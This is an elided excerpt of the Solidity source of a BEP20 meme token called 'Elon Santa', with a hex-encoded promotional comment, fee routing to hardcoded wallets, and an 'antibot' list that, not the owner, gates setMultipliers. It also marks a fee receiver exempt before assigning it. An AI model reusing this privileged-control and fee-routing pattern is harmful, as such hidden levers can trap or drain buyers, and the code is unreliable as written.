...
\x43\x6f\x75\x6c\x64\x20\x74\x68\x69\x73\x20\x62\x65\x20\x74\x68\x65\x20\x61\x6c\x70\x68\x61\x20\x79\x6f\x75\x76\x65\x20\x62\x65\x65\x6e\x20\x73\x65\x61\x72\x63\x68\x69\x6e\x67\x20\x66\x6f\x72\x20\x61\x6c\x6c\x20\x61\x6c\x6f\x6e\x67\x3f
...
contract ElonSanta is Ownable, IBEP20 {
    ...
    string constant _name = "Elon Santa";
    string constant _symbol = "eSanta";
    ...
    uint256 private xmasgiveawayFee = 1;
    uint256 private teamFee         = 2;
    uint256 public stakingFee      = 0;
    uint256 public totalFee        = teamFee + marketingFee + liquidityFee + xmasgiveawayFee + stakingFee;
    ...
    address private xmasgiveawayFeeReceiver;
    ...
    constructor () {
        ...
        isFeeExempt[xmasgiveawayFeeReceiver] = true;
        isantiboted[gasrouter] = true;
        isantiboted[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[pair] = true;
        isTxLimitExempt[marketingFeeReceiver] = true;
        isTxLimitExempt[xmasgiveawayFeeReceiver] = true;

        autoLiquidityReceiver = msg.sender;
        marketingFeeReceiver = 0x0556Ce6A2B1C2F0eFA0dF61e562BCdCF74bd0D44;
        xmasgiveawayFeeReceiver = 0x758DB42Aaac2b126834ffcc35E31e3867d6bC984;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != stakingFeeReceiver && recipient != xmasgiveawayFeeReceiver && recipient != marketingFeeReceiver && !isTxLimitExempt[recipient]){
    ...
    function setMultipliers(uint256 _buy, uint256 _sell, uint256 _trans) external {
        require(isantiboted[msg.sender]);
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBxmasgiveaway = amountBNB.mul(xmasgiveawayFee).div(totalBNBFee);

        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing}("");
        (tmpSuccess,) = payable(xmasgiveawayFeeReceiver).call{value: amountBNBxmasgiveaway}("");
    ...
    function setTax(uint256 _liquidityFee, uint256 _teamFee, uint256 _marketingFee, uint256 _xmasgiveawayFee, uint256 _stakingFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        teamFee = _teamFee;
        marketingFee = _marketingFee;
        xmasgiveawayFee = _xmasgiveawayFee;
        stakingFee = _stakingFee;
        totalFee = _liquidityFee.add(_teamFee).add(_marketingFee).add(_xmasgiveawayFee).add(_stakingFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/5, "Buy Fees cannot be more than 20%");
    }

    function setTaxReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _xmasgiveawayFeeReceiver, address _stakingFeeReceiver, address _teamFeeReceiver) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        xmasgiveawayFeeReceiver = _xmasgiveawayFeeReceiver;
